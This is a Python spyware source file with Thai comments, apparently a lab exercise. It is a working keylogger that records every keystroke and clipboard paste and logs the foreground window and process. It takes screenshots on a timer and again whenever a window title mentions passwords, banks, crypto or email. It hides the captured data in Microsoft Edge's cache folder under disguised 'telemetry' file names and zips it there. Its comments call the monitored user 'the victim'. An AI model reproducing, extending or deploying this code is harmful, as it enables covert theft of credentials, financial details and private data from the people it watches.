# phase4_spyware.py (อัปโหลดขึ้น GitHub ไฟล์ที่ 1)
import os
import time
import zipfile
from datetime import datetime
from ctypes import *
from pynput import keyboard
import tkinter as tk
from mss import MSS 

local_app_data = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
TARGET_DIR = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\Diagnostic_Packs")
log_file = os.path.join(TARGET_DIR, "f_0000a5.dat")     
ZIP_PATH = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\f_0000a6_idx.tmp") 

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
pressed_mods = set()

# --- [ กลไกตั้งเวลาควบคุมอัจฉริยะในแล็บ ] ---
start_time = time.time()
test_duration = 60       # 🧪 ระยะเวลาดักจับรวมในแล็บ: 60 วินาที
screenshot_interval = 15 # เวลาปกติแอบแคปจอทุกๆ 15 วินาที
last_screenshot_time = 0
current_listener = None  

# 🎯 รายชื่อคำสำคัญชั้นความลับที่มัลแวร์จะใช้จับพฤติกรรม (Behavioral Keywords)
CRITICAL_KEYWORDS = ["password", "login", "ธนาคาร", "bank", "crypto", "gmail", "outlook", "finance", "รหัส", "register"]

def init_log():
    if not os.path.exists(log_file):
        with open(log_file, "w", encoding="utf-8") as f:
            f.write("=== System Telemetry Subsystem Initialized ===\n")

def write_log(text):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def check_window_importance(window_title_str):
    """ฟังก์ชันสังเกตพฤติกรรมหน้าต่าง: ถ้าเจอคีย์เวิร์ดสำคัญ จะแอบสั่งถ่ายภาพหน้าจอทันทีสะสมหลักฐาน"""
    global screenshot_interval
    title_lower = window_title_str.lower()
    
    for keyword in CRITICAL_KEYWORDS:
        if keyword in title_lower:
            write_log(f"[🔥 CRITICAL WINDOW DETECTED] -> เหยื่อกำลังเข้าใช้งานระบบสำคัญเกี่ยวกับ: {keyword}")
            # สับเปลี่ยนเกียร์สปาย: บังคับแอบสั่งถ่ายรูปภาพหน้าจอเก็บหลักฐานวินาทีนั้นทันที!
            take_screenshot()
            return True
    return False

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong()
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = pid.value
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, process_id)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title = create_string_buffer(b"\x00" * 512)
    user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    title_str = window_title.value.decode(errors='ignore')
    write_log(f"\n[Active Context Changed | ID: {process_id} - {executable.value.decode(errors='ignore')} - {title_str}]")
    
    # รันระบบสังเกตพฤติกรรมคัดกรองความสำคัญของข้อมูล
    check_window_importance(title_str)
    kernel32.CloseHandle(h_process)

def get_clipboard_text():
    try:
        root = tk.Tk()
        root.withdraw()
        data = root.clipboard_get()
    except Exception: data = ""
    finally:
        try: root.destroy()
        except Exception: pass
    return data

def take_screenshot():
    with MSS() as sct:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(TARGET_DIR, f"f_cache_{timestamp}.dat") 
        sct.shot(output=filename)

def pack_data_to_zip():
    if not os.path.exists(TARGET_DIR) or not os.listdir(TARGET_DIR): return False
    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_name in os.listdir(TARGET_DIR):
            file_path = os.path.join(TARGET_DIR, file_name)
            if os.path.isfile(file_path): zipf.write(file_path, arcname=file_name)
    return True

def on_press(key):
    global current_window, last_screenshot_time, current_listener
    current_time = time.time()
    
    # เมื่อเก็บข้อมูลเงียบครบกำหนดเวลา สั่งมัด Zip ซ่อนในแคช Edge แล้วปลด Hooks ปล่อยหน้าจอปกติ
    if current_time - start_time >= test_duration:
        if current_listener:
            pack_data_to_zip() 
            current_listener.stop() 
            return False

    if current_time - last_screenshot_time >= screenshot_interval:
        take_screenshot()
        last_screenshot_time = current_time

    hwnd = user32.GetForegroundWindow()
    window_title = create_string_buffer(b"\x00" * 512)
    user32.GetWindowTextA(hwnd, byref(window_title), 512)
    if window_title.value != (current_window or b""):
        current_window = window_title.value
        get_current_process()

    try:
        if hasattr(key, 'char') and key.char is not None:
            write_log(f"In: {key.char}")
            return
    except Exception: pass

    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        pressed_mods.add('ctrl')
        return
    if key == keyboard.KeyCode.from_char('v') and 'ctrl' in pressed_mods:
        write_log(f"[Buffer Link Log] -> {get_clipboard_text()}")
        return
    write_log(f"SysIn: {str(key)}")

def on_release(key):
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r): pressed_mods.discard('ctrl')

def start_capture_workflow():
    global current_listener
    os.makedirs(TARGET_DIR, exist_ok=True)
    init_log()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        current_listener = listener
        listener.join()
